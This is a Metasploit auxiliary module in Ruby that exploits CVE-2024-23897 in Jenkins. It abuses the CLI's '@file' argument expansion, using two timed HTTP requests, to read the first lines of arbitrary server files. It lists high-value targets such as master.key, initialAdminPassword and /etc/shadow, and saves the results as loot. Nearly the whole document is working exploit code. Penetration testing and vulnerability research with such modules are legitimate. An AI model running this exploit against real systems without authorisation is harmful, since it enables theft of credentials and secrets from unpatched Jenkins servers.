##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Jenkins
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  CLI_OPERATIONS = { argument: 0, locale: 1, encoding: 2, start: 3, exit: 4, stdout: 7, stderr: 8 }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jenkins cli Ampersand Replacement Arbitrary File Read',
        'Description' => %q{
          This module utilizes the Jenkins cli protocol to run the `help` command.
          The cli is accessible with read-only permissions by default, which are
          all thats required.

          Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
          replace any `@<filename>` with the contents of a file. We are then able to retrieve
          the error message to read up to the first two lines of a file.

          Exploitation by hand can be done with the cli, see markdown documents for additional
          instructions.

          There are a few exploitation oddities:
          1. The injection point for the `help` command requires 2 input arguments.
          When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
          If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
          However, we can pad out the content by supplying a first argument.
          2. There is a strange timing requirement where the `download` (or first) request must get
          to the server first, but the `upload` (or second) request must be very close behind it.
          From testing against the docker image, it was found values between `.01` and `1.9` were
          viable. Due to the round trip time of the first request and response happening before
          request 2 would be received, it is necessary to use threading to ensure the requests
          happen within rapid succession.

          Files of value:
          * /var/jenkins_home/secret.key
          * /var/jenkins_home/secrets/master.key
          * /var/jenkins_home/secrets/initialAdminPassword
          * /etc/passwd
          * /etc/shadow
          * Project secrets and credentials
          * Source code, build artifacts
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Yaniv Nizry', # discovery
          'binganao', # poc
          'h4x0r-dz', # poc
          'Vozec' # poc
        ],
        'References' => [
          [ 'URL', 'https://www.jenkins.io/security/advisory/2024-01-24/'],
          [ 'URL', 'https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/'],
          [ 'URL', 'https://github.com/binganao/CVE-2024-23897'],
          [ 'URL', 'https://github.com/h4x0r-dz/CVE-2024-23897'],
          [ 'URL', 'https://github.com/Vozec/CVE-2024-23897'],
          [ 'CVE', '2024-23897'],
          ['EDB', '51993'],
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2024-01-24',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ ],
          'SideEffects' => [ ]
        },
        'DefaultOptions' => {
          'RPORT' => 8080,
          'HttpClientTimeout' => 3 # very quick response, so set this low
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Jenkins', '/']),
        OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
      ]
    )
    register_advanced_options(
      [
        OptFloat.new('DELAY', [true, 'Delay between first and second request', 0.5]),
        OptString.new('ENCODING', [true, 'Encoding to use for reading the file', 'UTF-8']),
        OptString.new('LOCALITY', [true, 'Locality to use for reading the file', 'en_US'])
      ]
    )
  end

  def check
    version = jenkins_version

    return Exploit::CheckCode::Safe('Unable to determine Jenkins version number') if version.blank?

    version = Rex::Version.new(version)

    if version <= Rex::Version.new('2.426.2') || # LTS check
       (version >= Rex::Version.new('2.427') && version <= Rex::Version.new('2.441')) # non-lts
      return Exploit::CheckCode::Appears("Found exploitable version: #{version}")
    end

    Exploit::CheckCode::Safe("Found non-exploitable version: #{version}")
  end

  def request_header
    cli_frame(CLI_OPERATIONS[:argument], cli_utf('help'))
  end

  def request_footer
    [
      cli_frame(CLI_OPERATIONS[:encoding], cli_utf(datastore['ENCODING'])),
      cli_frame(CLI_OPERATIONS[:locale], cli_utf(datastore['LOCALITY'])),
      cli_frame(CLI_OPERATIONS[:start])
    ]
  end

  def parameter_one
    cli_frame(CLI_OPERATIONS[:argument], cli_utf('1'))
  end

  def data_generator(pad: false)
    data = []
    data << request_header
    data << parameter_one if pad
    data << cli_frame(CLI_OPERATIONS[:argument], cli_utf("@#{datastore['FILE_PATH']}"))
    data << request_footer
    data.join('')
  end

  # DataOutputStream.writeUTF uses modified UTF-8: CESU-8 with a two-byte NUL.
  # https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/DataOutput.html#modified-utf-8
  def cli_utf(value)
    data = value.to_s.dup.force_encoding(::Encoding::UTF_8).encode(::Encoding::CESU_8).b.gsub("\x00".b, "\xc0\x80".b)
    fail_with(Failure::BadConfig, 'Jenkins CLI fields cannot exceed the 65,535-byte Java UTF limit') if data.bytesize > 65_535

    [data.bytesize].pack('n') + data
  rescue ::Encoding::InvalidByteSequenceError, ::Encoding::UndefinedConversionError => e
    elog('Failed to encode a Jenkins CLI field', error: e)
    fail_with(Failure::BadConfig, 'Jenkins CLI fields must contain valid UTF-8 text')
  end

  # The signed four-byte length excludes both the length field and the opcode.
  # https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/cli/src/main/java/hudson/cli/PlainCLIProtocol.java
  def cli_frame(operation, data = ''.b)
    [data.bytesize, operation].pack('NC') + data
  end

  def upload_request(uuid, multi_line_file: true, request_data: nil)
    # send upload request asking for file

    # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
    # which is required for successful exploitation
    sleep(datastore['DELAY'])
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => 'application/octet-stream',
      'headers' => {
        'Session' => uuid,
        'Side' => 'upload'
      },
      'vars_get' => {
        'remoting' => 'false'
      },
      'data' => request_data || data_generator(pad: multi_line_file)
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to upload request (response code: #{res.code})") unless res.code == 200
    # we don't get a response here, so we just need the request to go through and 200 us
  end

  def process_result(use_pad, result: nil)
    # the output comes back as follows:

    # ERROR: Too many arguments: <line 2>
    # java -jar jenkins-cli.jar help
    #   [COMMAND]
    # Lists all the available commands or a detailed description of single command.
    #   COMMAND : Name of the command (default: <line 1>)

    # The main thing here is we get the first 2 lines of output from the file.
    # The 2nd line from the file is returned on line 1 of the output, and line
    # 1 from the file is returned on the last line of output. If padding was used
    # then <line 1> will just be a literal 1

    result ||= parse_cli_response(@content_body)
    file_path = datastore['FILE_PATH'].to_s.dup.force_encoding(::Encoding::UTF_8)
    unless result[:exit_code] == 2
      vprint_error('Jenkins CLI did not expose file contents; verify FILE_PATH and read permissions')
      return
    end

    first_argument = nil
    extra_argument = nil
    result[:stderr].each_line(chomp: true) do |line|
      if line.start_with?('ERROR: Too many arguments: ')
        extra_argument = line.delete_prefix('ERROR: Too many arguments: ')
      elsif (match = line.lstrip.match(/\ACOMMAND : Name of the command \(default: (.*)\)\z/))
        first_argument = match[1]
      end
    end
    if first_argument.nil? || extra_argument.nil?
      vprint_error('Jenkins CLI did not return the expected file arguments')
      return
    end

    # if we padded out, then our first line is 1, so drop that
    file_contents = [first_argument, extra_argument]
    file_contents = file_contents.drop(1) if use_pad == true
    if file_contents == ["@#{file_path}"]
      vprint_error('Jenkins CLI did not expand the file argument; the target may be patched')
      return
    end

    print_good("#{file_path} file contents retrieved (first line or 2):\n#{file_contents.join("\n")}")
    stored_path = store_loot('jenkins.file', 'text/plain', rhost, file_contents.join("\n"), file_path)
    print_good("Results saved to: #{stored_path}")
  end

  def download_request(uuid)
    # send download request
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'headers' => {
        'Session' => uuid,
        'Side' => 'download'
      },
      'vars_get' => {
        'remoting' => 'false'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to download request (response code: #{res.code})") unless res.code == 200

    @content_body = res.body
  end

  def cli_output_encoding
    ::Encoding.find(datastore['ENCODING'])
  rescue ArgumentError => e
    elog('Failed to select Jenkins CLI output encoding', error: e)
    fail_with(Failure::BadConfig, 'ENCODING must name a supported character encoding')
  end

  def parse_cli_response(data)
    # FullDuplexHttpService writes a zero readiness byte before CLI frames.
    # https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/jenkins/util/FullDuplexHttpService.java
    unless data.is_a?(String) && data.getbyte(0) == 0
      fail_with(Failure::UnexpectedReply, 'Jenkins CLI response is missing its transport readiness byte')
    end

    result = { stdout: ''.b, stderr: ''.b, exit_code: nil }
    offset = 1
    while offset < data.bytesize
      fail_with(Failure::UnexpectedReply, 'Jenkins CLI response ended inside a frame header') if data.bytesize - offset < 5

      length, operation = data.byteslice(offset, 5).unpack('l>C')
      if length.negative? || length > data.bytesize - offset - 5
        fail_with(Failure::UnexpectedReply, 'Jenkins CLI response contains an invalid or incomplete frame length')
      end
      payload = data.byteslice(offset + 5, length)
      offset += length + 5
      case operation
      when CLI_OPERATIONS[:stdout]
        result[:stdout] << payload
      when CLI_OPERATIONS[:stderr]
        result[:stderr] << payload
      when CLI_OPERATIONS[:exit]
        unless length == 4 && result[:exit_code].nil?
          fail_with(Failure::UnexpectedReply, 'Jenkins CLI response contains an invalid or duplicate exit frame')
        end
        result[:exit_code] = payload.unpack1('l>')
      else
        fail_with(Failure::UnexpectedReply, "Jenkins CLI response contains an unexpected operation: #{operation}")
      end
    end
    fail_with(Failure::UnexpectedReply, 'Jenkins CLI response ended before its exit frame') if result[:exit_code].nil?

    encoding = cli_output_encoding
    %i[stdout stderr].each do |stream|
      value = result[stream].force_encoding(encoding)
      fail_with(Failure::UnexpectedReply, 'Jenkins CLI returned text that is invalid for ENCODING') unless value.valid_encoding?

      result[stream] = value.empty? ? '' : value.encode(::Encoding::UTF_8)
    end
    result
  rescue ::Encoding::InvalidByteSequenceError, ::Encoding::UndefinedConversionError => e
    elog('Failed to decode Jenkins CLI output', error: e)
    fail_with(Failure::UnexpectedReply, 'Jenkins CLI returned text that is invalid for ENCODING')
  end

  def perform_cli_request(pad:)
    @content_body = nil
    cli_output_encoding
    request_data = data_generator(pad: pad)
    uuid = SecureRandom.uuid
    print_status("Sending requests with UUID: #{uuid}")
    # Both HTTP channels must arrive close together, with download first.
    threads = []
    threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
      upload_request(uuid, multi_line_file: pad, request_data: request_data)
    end
    threads << framework.threads.spawn('CVE-2024-23897-download', false) { download_request(uuid) }
    threads.each(&:value)
    parse_cli_response(@content_body) if @content_body
  ensure
    threads&.each { |thread| thread.kill if thread.alive? }
  end

  def run
    use_pad = false
    result = perform_cli_request(pad: use_pad)
    if result && result[:exit_code] == 6 && result[:stderr].include?('ERROR: You must authenticate to access this Jenkins.')
      print_status('Re-attempting with padding for single line output file')
      use_pad = true
      result = perform_cli_request(pad: use_pad)
    end
    return process_result(use_pad, result: result) if result

    print_bad('Exploit failed, no exploit data was successfully returned')
  end
end
